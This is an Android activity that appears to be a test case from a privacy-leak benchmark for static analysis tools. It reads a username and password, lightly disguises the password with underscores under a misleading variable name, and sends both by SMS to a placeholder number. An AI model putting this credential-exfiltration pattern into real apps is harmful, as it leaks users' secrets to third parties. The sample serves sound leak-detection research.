package de.ecspride;

import android.app.Activity;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.util.Log;
import android.view.View;
import android.widget.EditText;
import de.ecspride.data.User;

public class PrivateDateLeakage extends Activity {
	private User user = null;
	
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_private_date_leakage);
    }
    
    @Override
	protected void onRestart(){
		super.onRestart();
		EditText usernameText = (EditText)findViewById(R.id.username);
		EditText passwordText = (EditText)findViewById(R.id.password);
		
		String uname = usernameText.toString();
		String pwd = passwordText.toString();
		
		user = new User(uname, pwd);
	}
	
	public void sendMessage(View view){
		if(user != null){
			String password = getPassword();
			String obfuscatedUsername = "";
			for(char c : password.toCharArray())
				obfuscatedUsername += c + "_";
			
			String message = "User: " + user.getUsername() + " | Pwd: " + obfuscatedUsername;
			SmsManager smsmanager = SmsManager.getDefault();
			Log.i("TEST", "sendSMS");
			smsmanager.sendTextMessage("+49 1234", null, message, null, null);
		}
	}
	
	private String getPassword(){
		if(user != null)
			return user.getPwd().getPassword();
		else{
			Log.e("ERROR", "no password set");
			return null;
		}
	}
   
}
